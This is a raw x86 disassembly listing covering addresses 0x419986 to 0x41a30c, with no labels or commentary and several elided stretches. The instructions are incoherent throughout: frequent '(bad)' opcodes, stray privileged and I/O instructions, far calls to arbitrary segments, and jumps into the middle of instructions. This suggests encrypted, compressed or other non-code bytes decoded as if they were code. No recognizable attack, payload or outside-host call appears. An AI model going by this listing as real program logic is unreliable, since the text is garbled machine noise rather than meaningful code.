  419986:	rcr    DWORD PTR [ebx+0x3c],cl
  419989:	ret    0x49ae
  41998c:	mov    ss,WORD PTR [edx]
  41998e:	je     0x41999c
  419990:	sub    BYTE PTR [edi-0x6dc2a879],dl
  419996:	and    bh,BYTE PTR [ecx]
  419998:	mov    DWORD PTR [ecx-0x3751b2a5],edi
  41999e:	bound  edx,QWORD PTR [edx-0x2758c219]
  4199a4:	sub    al,0x60
  4199a6:	and    BYTE PTR [eax],ah
  4199a8:	fcmovnb st,st(3)
  4199aa:	ds (bad) 
  4199ac:	mov    bl,0x4f
  4199ae:	fcmove st,st(6)
  4199b0:	mov    bl,0x8b
  4199b2:	rcl    BYTE PTR [ebp-0x26],cl
  4199b5:	loop   0x419a10
  4199b7:	into   
  4199b8:	call   0xb4ec0b53
  4199bd:	ret    
  4199be:	ret    
  4199bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199c0:	(bad)  
  4199c2:	push   ebp
  4199c3:	cmp    edi,esi
  4199c5:	pusha  
  4199c6:	stos   DWORD PTR es:[edi],eax
  4199c7:	ror    BYTE PTR [eax+edi*2],1
  4199ca:	dec    esi
  4199cb:	add    DWORD PTR [ecx],esi
  4199cd:	pop    eax
  4199ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199cf:	popa   
  4199d0:	xchg   edx,eax
  4199d1:	pop    edi
  4199d2:	jmp    0x4199c2
  4199d4:	push   0xffffffc8
  4199d6:	sahf   
  4199d7:	and    BYTE PTR [ebx-0x4b4df421],bl
  4199dd:	xchg   edx,eax
  4199de:	inc    edi
  4199df:	jnp    0x419a12
  4199e1:	sti    
  4199e2:	cmp    al,0xbb
  4199e4:	outs   dx,BYTE PTR ds:[esi]
  4199e5:	xor    bh,ah
  4199e7:	inc    edx
  4199e8:	das    
  4199e9:	jle    0x419a01
  4199eb:	xor    BYTE PTR [edi+eax*4-0xbd22d7],0x12
  4199f3:	cmp    edi,esp
  4199f5:	add    eax,0x1466d757
  4199fa:	iret   
  4199fb:	and    DWORD PTR [ecx-0x1f5ec5a3],eax
  419a01:	daa    
  419a02:	jle    0x419a01
  419a04:	shl    DWORD PTR [ecx+eiz*4-0x7b267921],0xb7
  419a0c:	ds fist DWORD PTR gs:[edx]
	...
  419a74:	xor    esi,DWORD PTR [ecx]
  419a76:	xchg   ebx,eax
  419a77:	lds    edx,FWORD PTR [ebx-0x34088819]
  419a7d:	rcl    DWORD PTR ds:0x69010bc2,cl
  419a83:	int3   
  419a84:	ror    BYTE PTR [edi],1
  419a86:	add    DWORD PTR [eax],eax
  419a88:	add    al,0x1
  419a8a:	add    BYTE PTR [eax],al
  419a8c:	xchg   edx,eax
  419a8d:	sbb    edx,DWORD PTR [edi+0x5fae3197]
  419a93:	jnp    0x419a3a
  419a95:	les    ecx,FWORD PTR [eax]
  419a97:	std    
  419a98:	sub    al,cl
  419a9a:	pop    ds
  419a9b:	icebp  
  419a9c:	sub    eax,0xc12c26b8
  419aa1:	(bad)  
  419aa2:	(bad)  
  419aa3:	xor    eax,0x8dbeb138
  419aa8:	enter  0x1ac0,0xbc
  419aac:	xlat   BYTE PTR ds:[ebx]
  419aad:	fsubr  QWORD PTR [esi+0x4a]
  419ab0:	test   edx,edi
  419ab2:	xor    eax,0x6c487b44
  419ab7:	adc    BYTE PTR [edx-0x43a777d0],cl
  419abd:	fisub  DWORD PTR [eax+0x49346683]
  419ac3:	jg     0x419a61
  419ac5:	(bad)  
  419ac6:	and    ebp,ebx
  419ac8:	sub    BYTE PTR [esi-0x14],al
  419acb:	dec    ebp
  419acc:	aaa    
  419acd:	popf   
  419ace:	add    al,BYTE PTR [esi+0x1fcb7f15]
  419ad4:	pop    edi
  419ad5:	inc    ecx
  419ad6:	imul   ebx,DWORD PTR [eax+0x4e8e98c1],0xfffffff5
  419add:	or     bl,ch
  419adf:	sub    DWORD PTR [ebx+esi*1],edx
  419ae2:	adc    al,0x3f
  419ae4:	and    al,0x8
  419ae6:	sahf   
  419ae7:	call   0x436a865d
  419aec:	xlat   BYTE PTR ds:[ebx]
  419aed:	and    DWORD PTR [eax],ecx
  419aef:	stos   DWORD PTR es:[edi],eax
  419af0:	cwde   
  419af1:	mov    edx,0xf1220c12
  419af6:	push   eax
  419af7:	shl    BYTE PTR [edx],0x20
  419afa:	sub    edx,DWORD PTR [ebx+0x32]
  419afd:	mov    ah,0x63
  419aff:	xor    ebx,esp
  419b01:	(bad)  
  419b03:	(bad)  
  419b04:	cmp    cl,BYTE PTR [ecx]
  419b06:	mov    bh,0x70
  419b08:	dec    esp
  419b09:	jge    0x419b46
  419b0b:	ret    0x585f
  419b0e:	out    0xe,al
  419b10:	push   ecx
  419b11:	push   edx
  419b12:	pop    ss
  419b13:	mov    cl,0xa2
  419b15:	mov    bl,0x85
  419b17:	test   eax,0xa9f53ab0
  419b1c:	push   ecx
  419b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b1e:	pop    es
  419b1f:	dec    ebx
  419b20:	icebp  
  419b21:	hlt    
  419b22:	xchg   esi,eax
  419b23:	into   
  419b24:	punpckldq mm0,DWORD PTR [edi]
  419b27:	cmp    eax,DWORD PTR [ebp-0x77]
  419b2a:	jno    0x419b34
  419b2c:	popa   
  419b2d:	fist   WORD PTR [edi]
  419b2f:	or     esp,DWORD PTR [edx]
  419b31:	adc    ebp,DWORD PTR [ecx+0x66346857]
  419b37:	cli    
  419b38:	xchg   DWORD PTR [ebx-0x4e],ebp
  419b3b:	bnd jb 0x419b56
  419b3e:	popa   
  419b3f:	cmp    eax,0x37efdb02
  419b44:	outs   dx,DWORD PTR ds:[esi]
  419b45:	stos   DWORD PTR es:[edi],eax
  419b46:	and    DWORD PTR [eax+eax*1+0x2ff40aad],esi
  419b4d:	xor    al,0xfe
  419b4f:	or     al,0x24
  419b51:	stc    
  419b52:	push   ecx
  419b53:	dec    esp
  419b54:	(bad)  
  419b55:	(bad)  
  419b56:	sub    dl,BYTE PTR [esi]
  419b58:	fild   WORD PTR [esi]
  419b5a:	aas    
  419b5b:	adc    BYTE PTR [ebp+esi*4-0x4fb56775],bl
  419b62:	retf   
  419b63:	jo     0x419bb5
  419b65:	push   cs
  419b66:	mul    BYTE PTR [ebx-0x3]
  419b69:	or     DWORD PTR [ebx],eax
  419b6b:	add    BYTE PTR [ebp+0x1a],bh
  419b6e:	dec    DWORD PTR [edx-0x7c21e981]
  419b74:	stos   BYTE PTR es:[edi],al
  419b75:	cmc    
  419b76:	cmc    
  419b77:	xlat   BYTE PTR ds:[ebx]
  419b78:	mov    eax,0x698621de
  419b7d:	dec    esp
  419b7e:	and    esp,ecx
  419b80:	ret    0x6355
  419b83:	(bad)  
  419b84:	mov    al,0xb0
  419b86:	jb     0x419b50
  419b88:	stc    
  419b89:	stc    
  419b8a:	rol    BYTE PTR [ebp+ecx*2+0xa2c7d2],1
	...
  419bf1:	add    BYTE PTR [eax],al
  419bf3:	add    BYTE PTR [edx-0x3c],cl
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x2f
  419c01:	or     bl,BYTE PTR [ebp-0x4b]
  419c04:	aam    0x10
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    al,0x1
  419c0a:	add    BYTE PTR [eax],al
  419c0c:	inc    edx
  419c0d:	sbb    esp,esp
  419c0f:	add    al,0x2c
  419c11:	jbe    0x419be2
  419c13:	div    DWORD PTR [ecx+0x53007379]
  419c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c1a:	inc    eax
  419c1b:	int    0x81
  419c1d:	dec    edi
  419c1e:	icebp  
  419c1f:	call   FWORD PTR [ebx]
  419c21:	inc    ebp
  419c22:	cdq    
  419c23:	push   ss
  419c24:	sub    BYTE PTR [ecx],dl
  419c26:	ss xor eax,0x8006bb24
  419c2c:	xor    ebx,esi
  419c2e:	mov    esp,DWORD PTR [eax+0x585af891]
  419c34:	mov    eax,0xbdb81a53
  419c39:	xor    al,0x10
  419c3b:	pop    ecx
  419c3c:	push   0xd
  419c3e:	jl     0x419bf8
  419c40:	pop    edx
  419c41:	sub    al,0xd8
  419c43:	adc    edi,DWORD PTR [esi+0x6]
  419c46:	ror    DWORD PTR [edx+0x51b2ee1e],0x1e
  419c4d:	inc    ebx
  419c4e:	ret    
  419c4f:	leave  
  419c50:	leave  
  419c51:	xchg   ebx,eax
  419c52:	add    ebx,DWORD PTR [ecx+0x3c]
  419c55:	int3   
  419c56:	aaa    
  419c57:	arpl   WORD PTR [ebx],cx
  419c59:	mov    BYTE PTR [edx],al
  419c5b:	inc    ebx
  419c5c:	addr16 jg 0x419ccb
  419c5f:	and    al,0x2c
  419c61:	adc    al,0xfc
  419c63:	sub    BYTE PTR [ebp-0x74da4fbd],ch
  419c69:	xchg   ebp,eax
  419c6a:	push   0x3d4e013e
  419c6f:	ja     0x419ca3
  419c71:	mov    esi,0x40aa4e5f
  419c76:	fbstp  TBYTE PTR [esi-0x25]
  419c79:	jmp    0xe1d40d9
  419c7e:	iret   
  419c7f:	add    bl,BYTE PTR [ecx-0xf75ea69]
  419c85:	(bad)  
  419c86:	test   BYTE PTR [edx-0x29],0x2a
  419c8a:	repnz stc 
  419c8c:	mov    al,BYTE PTR [eax]
  419c8e:	xchg   esi,eax
  419c8f:	jo     0x419cdd
  419c91:	arpl   cx,dx
  419c93:	mov    ebp,0xf1f67a3d
  419c98:	popa   
  419c99:	adc    DWORD PTR ds:0x766442fe,ecx
  419c9f:	and    BYTE PTR [eax+ebx*1+0x201fd9a],dl
  419ca6:	icebp  
  419ca7:	lods   al,BYTE PTR ds:[esi]
  419ca8:	popf   
  419ca9:	lods   eax,DWORD PTR cs:[esi]
  419cab:	pushf  
  419cac:	fist   WORD PTR [edx+ecx*8]
  419caf:	xor    ah,BYTE PTR [ebp+ebp*8+0x3b]
  419cb3:	scas   al,BYTE PTR es:[edi]
  419cb4:	call   0xcc5:0x2b742e7b
  419cbb:	push   edi
  419cbc:	lods   eax,DWORD PTR ds:[esi]
  419cbd:	(bad)  
  419cbe:	jg     0x419d22
  419cc0:	inc    esp
  419cc1:	pop    ds
  419cc2:	out    0x79,al
  419cc4:	frstor [ecx-0x48de63be]
  419cca:	mov    edi,0xd258414f
  419ccf:	xchg   ebx,eax
  419cd0:	cmp    al,0x52
  419cd2:	xor    BYTE PTR [ebx-0x44],cl
  419cd5:	adc    DWORD PTR [esp+ecx*4],ebp
  419cd8:	mov    dh,0xf0
  419cda:	test   bh,al
  419cdc:	stc    
  419cdd:	dec    edi
  419cde:	mov    ds:0xd65c44d0,al
  419ce3:	sub    edx,DWORD PTR [ecx+0x5a]
  419ce6:	call   0xfb6a:0x2af58def
  419ced:	test   BYTE PTR [edi],al
  419cef:	in     eax,0x12
  419cf1:	push   edi
  419cf2:	neg    DWORD PTR [eax+0x1f593d9d]
  419cf8:	pusha  
  419cf9:	push   cs
  419cfa:	or     ebp,ebp
  419cfc:	jle    0x419cc1
  419cfe:	scas   eax,DWORD PTR es:[edi]
  419cff:	sub    eax,0xfe29d106
  419d04:	cwde   
  419d05:	pop    ebx
  419d06:	inc    edi
  419d07:	and    eax,DWORD PTR [ecx-0x3f]
  419d0a:	pop    esi
  419d0b:	add    DWORD PTR [ebp-0x19],ebp
  419d0e:	mov    esp,0xa3
	...
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fiadd  DWORD PTR ss:[edx+ecx*2+0x11d801d9]
  419d86:	add    DWORD PTR [eax],eax
  419d88:	add    al,0x1
  419d8a:	add    BYTE PTR [eax],al
  419d8c:	adc    ch,ah
  419d8e:	int3   
  419d8f:	aaa    
  419d90:	sbb    esp,DWORD PTR [eax+0x288bee23]
  419d96:	retf   
  419d97:	push   esp
  419d98:	pop    esp
  419d99:	jne    0x419df4
  419d9b:	and    DWORD PTR [ebp*2-0x7ac5bbb3],0x1f
  419da3:	pop    eax
  419da4:	das    
  419da5:	loopne 0x419ddf
  419da7:	lea    esp,es:0x42dcfb9
  419dae:	cmp    cl,BYTE PTR [edx-0x22]
  419db1:	repz adc edx,ecx
  419db4:	ins    BYTE PTR es:[edi],dx
  419db5:	xchg   ebp,eax
  419db6:	fistp  DWORD PTR [ebp-0x15ce520e]
  419dbc:	xchg   BYTE PTR [ebx-0x323dd042],cl
  419dc2:	loope  0x419e1f
  419dc4:	fild   QWORD PTR [esi+0x25]
  419dc7:	fs xchg edi,eax
  419dc9:	mov    edx,DWORD PTR [eax+0x3e]
  419dcc:	xor    ch,BYTE PTR [ebp+0x17f887f7]
  419dd2:	stc    
  419dd3:	and    ch,cl
  419dd5:	mov    BYTE PTR [edx],ch
  419dd7:	push   ss
  419dd8:	and    esi,ecx
  419dda:	aad    0xc2
  419ddc:	push   ebp
  419ddd:	push   0x78d71304
  419de2:	sti    
  419de3:	retf   0x75de
  419de6:	dec    edi
  419de7:	std    
  419de8:	(bad)  
  419de9:	iret   
  419dea:	cld    
  419deb:	sti    
  419dec:	and    BYTE PTR [esi+0x74],0xc2
  419df0:	sub    eax,0x7e06f06
  419df5:	cdq    
  419df6:	xor    cl,BYTE PTR [edx]
  419df8:	cs adc eax,0x82693045
  419dfe:	jle    0x419e60
  419e00:	jns    0x419d89
  419e02:	pop    ss
  419e03:	xchg   BYTE PTR [ecx-0x290fc88e],bh
  419e09:	mov    ebx,0x5d16621
  419e0e:	std    
  419e0f:	jl     0x419e3e
  419e11:	(bad)  
  419e12:	std    
  419e13:	out    dx,eax
  419e14:	into   
  419e15:	sub    edx,esp
  419e17:	loopne 0x419de6
  419e19:	xor    BYTE PTR [eax-0x5f],ch
  419e1c:	cmc    
  419e1d:	inc    ebx
  419e1e:	inc    esi
  419e1f:	ret    
  419e20:	xchg   ebp,eax
  419e21:	push   ebp
  419e22:	xchg   edx,eax
  419e23:	scas   eax,DWORD PTR es:[edi]
  419e24:	lods   al,BYTE PTR ds:[esi]
  419e25:	ret    0xb9f7
  419e28:	jmp    0x24beb3df
  419e2d:	(bad)  
  419e2e:	jbe    0x419dff
  419e30:	stos   DWORD PTR es:[edi],eax
  419e31:	dec    ebp
  419e32:	test   cl,bl
  419e34:	neg    edx
  419e36:	in     al,0xd9
  419e38:	ror    DWORD PTR [esi+edi*1+0x62],0x98
  419e3d:	pop    edi
  419e3e:	mov    al,0x93
  419e40:	pop    ebx
  419e41:	leave  
  419e42:	dec    ebp
  419e43:	xchg   ebp,eax
  419e44:	mov    ch,0xde
  419e46:	call   0x2fd48039
  419e4b:	jp     0x419dfa
  419e4d:	mov    ds:0x1eb4e39d,al
  419e52:	adc    al,0xc2
  419e54:	pop    ds
  419e55:	sub    DWORD PTR [ebx],0xffffffd7
  419e58:	(bad)  
  419e59:	pop    edx
  419e5a:	ds repz aad 0x6b
  419e5e:	xor    esi,esp
  419e60:	mov    edi,0x9fc6f5ae
  419e65:	add    BYTE PTR [edx+ebp*4-0x37],0xe7
  419e6a:	push   0x17a7af0a
  419e6f:	adc    dl,BYTE PTR [edi+0x73]
  419e72:	cmc    
  419e73:	add    dh,BYTE PTR [ebx-0x76]
  419e76:	mov    ecx,0x86d9ab14
  419e7b:	pop    esp
  419e7c:	jmp    0x419e79
  419e7e:	and    edx,eax
  419e80:	outs   dx,BYTE PTR ds:[esi]
  419e81:	mov    ch,0x1d
  419e83:	jg     0x419e3f
  419e85:	loop   0x419ed1
  419e87:	pop    ebp
  419e88:	cmp    cl,BYTE PTR [edx-0x42]
  419e8b:	jecxz  0x419e46
  419e8d:	mov    ebp,0xf0c1
	...
  419ef2:	add    BYTE PTR [eax],al
  419ef4:	xchg   eax,ebx
  419ef6:	pop    ss
  419ef7:	lds    ebx,FWORD PTR [edi-0x31]
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	mov    ds:0xdcd0a6e7,al
  419f05:	adc    al,BYTE PTR [ecx]
  419f07:	add    BYTE PTR [ecx+eax*1],al
  419f0a:	add    BYTE PTR [eax],al
  419f0c:	adc    al,0xfa
  419f0e:	cmp    al,0x1d
  419f10:	dec    ecx
  419f11:	imul   eax,DWORD PTR [ecx+0x21],0x31
  419f15:	mov    edx,0x6cb42b96
  419f1a:	xchg   ecx,eax
  419f1b:	popa   
  419f1c:	hlt    
  419f1d:	adc    BYTE PTR [edi+0x3b],bl
  419f20:	add    al,0xa3
  419f22:	call   0xc43e4942
  419f27:	cmp    al,0xce
  419f29:	mov    WORD PTR [edx+0x77],?
  419f2c:	mov    dh,0x99
  419f2e:	ins    BYTE PTR es:[edi],dx
  419f2f:	xchg   BYTE PTR [ecx-0x6c],ch
  419f32:	push   cs
  419f33:	enter  0x992,0xca
  419f37:	add    BYTE PTR [ecx],ch
  419f39:	retf   0xc88c
  419f3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f3d:	mov    DWORD PTR [esi+0x5f],esi
  419f40:	mov    cs,WORD PTR ds:0x8280d967
  419f46:	add    al,ah
  419f48:	test   BYTE PTR [ebx+0x5c],dh
  419f4b:	inc    eax
  419f4c:	bound  esp,QWORD PTR [edi+eax*1-0x40]
  419f50:	xchg   ebp,eax
  419f51:	jne    0x419f07
  419f53:	jbe    0x419ef6
  419f55:	stos   BYTE PTR es:[edi],al
  419f56:	jne    0x419f9a
  419f58:	and    DWORD PTR [edi-0x313d13bb],edi
  419f5e:	mov    ds:0x981960eb,eax
  419f63:	mov    ds:0x80dabb0d,eax
  419f68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f69:	sti    
  419f6a:	xchg   ebp,eax
  419f6b:	sbb    BYTE PTR [edx+0x5b],0xeb
  419f6f:	repz jecxz 0x419f51
  419f72:	pop    edi
  419f73:	xor    esp,DWORD PTR [ebx-0x710cff2b]
  419f79:	int    0xf6
  419f7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f7c:	jae    0x419fbd
  419f7e:	xchg   DWORD PTR [edx+0x79],ebx
  419f81:	iret   
  419f82:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  419f84:	jmp    0x419fd8
  419f86:	pop    edx
  419f87:	xchg   BYTE PTR [ebx+0x2f5d121c],ah
  419f8d:	pop    edi
  419f8e:	imul   esp,DWORD PTR [ecx-0x4934f9d4],0x23
  419f95:	pop    edi
  419f96:	mov    edx,0xd85c37c8
  419f9b:	inc    eax
  419f9c:	daa    
  419f9d:	leave  
  419f9e:	cli    
  419f9f:	in     al,dx
  419fa0:	(bad)  
  419fa1:	mov    edi,0x9cea23a6
  419fa6:	jo     0x419ff8
  419fa8:	adc    DWORD PTR [ebx*1+0x6c8f583],edx
  419faf:	mov    edi,0xc183f72a
  419fb4:	mov    ecx,0xb7646c81
  419fb9:	test   DWORD PTR [esi],edi
  419fbb:	sub    DWORD PTR ds:0xdb52ec07,ebx
  419fc1:	mov    cl,0xf9
  419fc3:	test   dl,dh
  419fc5:	fisub  DWORD PTR [esi+0x27]
  419fc8:	sub    edi,DWORD PTR [ecx+0x3a8cb10e]
  419fce:	(bad)  
  419fd0:	sub    edx,DWORD PTR [edx-0x507f13b1]
  419fd6:	int    0x16
  419fd8:	mov    dh,0x17
  419fda:	(bad)  
  419fdb:	mov    eax,0xf6a8e40f
  419fe0:	(bad)  
  419fe1:	jmp    FWORD PTR [ebx+0x5e]
  419fe4:	push   esp
  419fe5:	dec    eax
  419fe6:	mov    DWORD PTR [edx],esp
  419fe8:	sahf   
  419fe9:	add    al,al
  419feb:	xor    edi,DWORD PTR [eax+ebx*4+0x5320d68b]
  419ff2:	xor    eax,0xb5397045
  419ff7:	cmp    dl,0xd2
  419ffa:	lea    edx,[edi]
  419ffc:	push   es
  419ffd:	jecxz  0x41a038
  419fff:	test   al,0xe3
  41a001:	cmp    bh,bh
  41a003:	cmp    ch,BYTE PTR ss:[eax]
  41a006:	imul   esp,ebp,0x7377cd66
  41a00c:	fbstp  TBYTE PTR [ebp+0x38]
  41a00f:	jmp    0x0:0x0
	...
  41a072:	add    BYTE PTR [eax],al
  41a074:	dec    esi
  41a075:	jmp    0x41a0a1
  41a077:	dec    esi
  41a078:	scas   eax,DWORD PTR es:[edi]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x1e],bh
  41a081:	cwde   
  41a082:	or     BYTE PTR [esi+0x113e0],ah
  41a088:	add    al,0x1
  41a08a:	add    BYTE PTR [eax],al
  41a08c:	xlat   BYTE PTR ds:[ebx]
  41a08d:	addr16 retf 
  41a08f:	int    0xe2
  41a091:	cmp    DWORD PTR [esi],0x49560ac7
  41a097:	daa    
  41a098:	jbe    0x41a114
  41a09a:	stc    
  41a09b:	pop    ds
  41a09c:	sbb    ecx,eax
  41a09e:	pop    ecx
  41a09f:	and    dh,BYTE PTR [esp+edi*4]
  41a0a2:	adc    DWORD PTR [ecx],esi
  41a0a4:	mov    bh,BYTE PTR ds:0xaca73c2d
  41a0aa:	ror    BYTE PTR ds:0xcf7fdaf4,0x6e
  41a0b1:	pop    ebx
  41a0b2:	pushf  
  41a0b3:	xlat   BYTE PTR ds:[ebx]
  41a0b4:	push   ecx
  41a0b5:	push   cs
  41a0b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0b7:	mov    ah,0xc
  41a0b9:	push   ebx
  41a0ba:	jl     0x41a108
  41a0bc:	outs   dx,BYTE PTR ds:[esi]
  41a0bd:	mov    eax,0x1e974a2e
  41a0c2:	bound  ecx,QWORD PTR [eax]
  41a0c4:	adc    DWORD PTR [edx],esi
  41a0c6:	jp     0x41a06f
  41a0c8:	adc    DWORD PTR [edi-0x7feffb66],eax
  41a0ce:	sbb    edx,DWORD PTR fs:[ecx-0x24]
  41a0d2:	imul   eax,DWORD PTR [esi-0x7a],0x8286fbf1
  41a0d9:	pop    ss
  41a0da:	sub    BYTE PTR [ecx-0x50],bl
  41a0dd:	les    ebp,FWORD PTR [eax]
  41a0df:	adc    al,0x1
  41a0e1:	push   ebx
  41a0e2:	inc    BYTE PTR [eax+0x3d]
  41a0e5:	fbstp  TBYTE PTR [ebp+0xd]
  41a0e8:	lea    ebp,[esi+ebx*1-0x3f]
  41a0ec:	(bad)  
  41a0ed:	push   ss
  41a0ee:	inc    esp
  41a0ef:	(bad)  
  41a0f0:	mov    dl,dl
  41a0f2:	dec    edi
  41a0f3:	mov    esp,0x1a6d5f6e
  41a0f8:	std    
  41a0f9:	sub    DWORD PTR [ecx+0x582f5b0e],0x41
  41a100:	sub    al,0xe7
  41a102:	dec    eax
  41a103:	mov    eax,ds:0x5c0ce25d
  41a108:	rcl    DWORD PTR [esi],1
  41a10a:	xchg   BYTE PTR [edi],ch
  41a10c:	std    
  41a10d:	sbb    al,0xf9
  41a10f:	out    dx,al
  41a110:	push   esp
  41a111:	and    DWORD PTR [ecx],ebp
  41a113:	and    edi,DWORD PTR [edx]
  41a115:	pop    eax
  41a116:	mov    ah,0x30
  41a118:	dec    edx
  41a119:	lahf   
  41a11a:	sub    ebx,DWORD PTR ds:0x215b2d5b
  41a120:	push   ds
  41a121:	xchg   BYTE PTR [ebx-0x2c],bl
  41a124:	jg     0x41a123
  41a126:	sbb    al,BYTE PTR [ecx]
  41a128:	sbb    eax,0xc02bdb7e
  41a12d:	push   ecx
  41a12e:	jnp    0x41a171
  41a130:	ins    DWORD PTR es:[edi],dx
  41a131:	and    edx,esi
  41a133:	imul   ebx,DWORD PTR [ecx-0x1feb658f],0xc154cd3d
  41a13d:	add    edx,DWORD PTR [ecx+0x2d9cca63]
  41a143:	shl    DWORD PTR [eax-0x20c00c64],0x4
  41a14a:	lds    ebp,FWORD PTR [ebp-0x6f]
  41a14d:	sbb    ah,BYTE PTR [eax+0x67]
  41a150:	repz loop 0x41a172
  41a153:	(bad)  
  41a154:	jp     0x41a18c
  41a156:	jge    0x41a10b
  41a158:	cmc    
  41a159:	push   ds
  41a15a:	lods   eax,DWORD PTR ds:[esi]
  41a15b:	push   eax
  41a15c:	je     0x41a199
  41a15e:	mov    edx,0xc72de735
  41a163:	mov    esi,0xdd53e292
  41a168:	jnp    0x41a0fc
  41a16a:	(bad)  
  41a16b:	sbb    BYTE PTR [esi+0x44],ch
  41a16e:	es dec ecx
  41a170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a171:	mov    ebx,0xa9d522c3
  41a176:	mov    edi,DWORD PTR [esi-0x63]
  41a179:	les    edi,FWORD PTR [ecx+eiz*8]
  41a17c:	pop    ebp
  41a17d:	add    BYTE PTR [ebx+0x1fa3ff2e],cl
  41a183:	fbstp  TBYTE PTR [eax+0xa]
  41a186:	dec    esi
  41a187:	lock push esp
  41a189:	jmp    0x5de98ce4
  41a18e:	push   esi
  41a18f:	dec    ebp
	...
  41a1f4:	sbb    al,0xc
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	jo     0x41a20d
  41a202:	mov    ds:0x114e477,al
  41a207:	add    BYTE PTR [ecx+eax*1],al
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	push   ecx
  41a20d:	mov    ebp,0x35380043
  41a212:	jmp    0x7f1342fe
  41a217:	sahf   
  41a218:	mov    cl,0xe
  41a21a:	inc    ebp
  41a21b:	test   DWORD PTR [ebx],edi
  41a21d:	add    cl,dh
  41a21f:	xchg   esi,eax
  41a220:	xor    al,0x4d
  41a222:	or     eax,DWORD PTR [eax+0x36]
  41a225:	scas   eax,DWORD PTR es:[edi]
  41a226:	sahf   
  41a227:	rcr    DWORD PTR [eax+0x2665aae3],1
  41a22d:	loop   0x41a275
  41a22f:	sahf   
  41a230:	jecxz  0x41a254
  41a232:	nop
  41a233:	mov    esp,DWORD PTR [ebx]
  41a235:	or     eax,0xbaa454b7
  41a23a:	or     DWORD PTR [ecx+0xa],edx
  41a23d:	ficomp WORD PTR [esi-0xc]
  41a240:	mov    eax,ds:0xbabfd967
  41a245:	pop    esp
  41a246:	push   esi
  41a247:	jmp    DWORD PTR [esi-0x5a89c135]
  41a24d:	add    al,0xb6
  41a24f:	cwde   
  41a250:	imul   esp,DWORD PTR [ebp-0x1e],0x6a5917e9
  41a257:	stc    
  41a258:	cli    
  41a259:	cvtdq2ps xmm7,XMMWORD PTR [esi+eiz*8]
  41a25d:	sbb    al,0x6c
  41a25f:	inc    ecx
  41a260:	fs adc al,0xf1
  41a263:	fs push edi
  41a265:	sbb    al,0x8d
  41a268:	aaa    
  41a269:	daa    
  41a26a:	lods   al,BYTE PTR ds:[esi]
  41a26b:	xchg   esp,eax
  41a26c:	sub    dl,bl
  41a26e:	mov    esp,DWORD PTR ss:[esi-0x5a]
  41a272:	(bad)  
  41a273:	dec    edi
  41a274:	adc    al,0xc6
  41a276:	in     al,dx
  41a277:	inc    eax
  41a278:	mov    ecx,0x1dddeeb7
  41a27d:	retf   0x1913
  41a280:	imul   ebp,edx,0x18
  41a283:	xchg   ebx,eax
  41a284:	push   edi
  41a285:	push   edx
  41a286:	mov    DWORD PTR [edx-0x24],esp
  41a289:	sub    cl,cl
  41a28b:	push   ss
  41a28c:	pop    ss
  41a28d:	ins    DWORD PTR es:[edi],dx
  41a28e:	les    ebp,FWORD PTR [ebx+0x5a]
  41a291:	paddusb mm5,QWORD PTR [eax+0x46]
  41a295:	mov    ss,WORD PTR [ecx+0x6879098c]
  41a29b:	push   esp
  41a29c:	jp     0x41a2f5
  41a29e:	daa    
  41a29f:	sbb    edx,DWORD PTR [esi+0x67]
  41a2a2:	add    DWORD PTR gs:[ebp-0x7b19ba03],edi
  41a2a9:	fstp   TBYTE PTR [ecx+eax*8+0x31]
  41a2ad:	(bad)  
  41a2ae:	div    BYTE PTR [ebx+esi*8]
  41a2b1:	aad    0x35
  41a2b3:	aas    
  41a2b4:	push   ss
  41a2b5:	mov    bl,0x70
  41a2b7:	add    eax,0x7873897f
  41a2bc:	gs inc edx
  41a2be:	int    0xbe
  41a2c0:	inc    esi
  41a2c1:	fimul  DWORD PTR [edi+0x7900dc0]
  41a2c7:	mov    BYTE PTR [ecx+0x59],bh
  41a2ca:	pop    edx
  41a2cb:	sub    al,0x78
  41a2cd:	bound  ebx,QWORD PTR [edi]
  41a2cf:	mov    dh,0xc2
  41a2d1:	inc    ecx
  41a2d2:	pop    ds
  41a2d3:	test   DWORD PTR fs:[eax-0x6e],ebx
  41a2d7:	add    bl,BYTE PTR [esi]
  41a2d9:	sbb    eax,0xaae6ec55
  41a2de:	xchg   esp,eax
  41a2df:	xchg   edi,eax
  41a2e0:	(bad)  
  41a2e1:	xlat   BYTE PTR ds:[ebx]
  41a2e2:	mov    WORD PTR [ebx],fs
  41a2e4:	mov    eax,DWORD PTR [ecx+ebx*1-0x383743f4]
  41a2eb:	pop    ss
  41a2ec:	aas    
  41a2ed:	jne    0x41a2d7
  41a2ef:	div    BYTE PTR [edi+0x16]
  41a2f2:	xor    BYTE PTR [ebp+0x5430a11],cl
  41a2f8:	add    bl,BYTE PTR [edx]
  41a2fa:	lock fstp TBYTE PTR [edi+ebp*2-0x4b7e803e]
  41a302:	(bad)  
  41a303:	mov    ah,0xea
  41a305:	aad    0xfa
  41a307:	cmp    eax,0x1990745f
  41a30c:	jecxz  0x41a2ad
